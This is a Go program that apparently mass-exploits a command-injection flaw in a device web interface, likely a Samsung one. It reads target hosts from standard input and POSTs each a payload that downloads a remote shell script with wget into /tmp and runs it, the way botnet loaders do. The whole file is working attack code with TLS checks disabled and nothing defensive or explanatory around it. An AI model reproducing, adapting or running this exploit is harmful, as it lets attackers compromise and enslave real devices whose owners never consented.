package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
)

var payload = "cd /tmp;rm -rf wget.sh;wget http://asdf/wget.sh;sh wget.sh samsung;"

func Exploit(target string, wg *sync.WaitGroup) {
	defer wg.Done()

	form := &url.Values{}
	form.Add("command1", fmt.Sprintf("shell:%s| dd of=/tmp/a.txt", payload))

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{
		Transport: tr,
	}

	targetUrl := fmt.Sprintf("http://%s/(download)/tmp/a.txt", target)
	client.Post(targetUrl, "application/x-www-form-urlencoded", strings.NewReader(form.Encode()))

	fmt.Printf("exploited > %s\r\n", target)
}

func main() {
	var wg sync.WaitGroup
	scanner := bufio.NewScanner(os.Stdin)

	for scanner.Scan() {
		wg.Add(1)
		go Exploit(scanner.Text(), &wg)
	}

	wg.Wait()
}
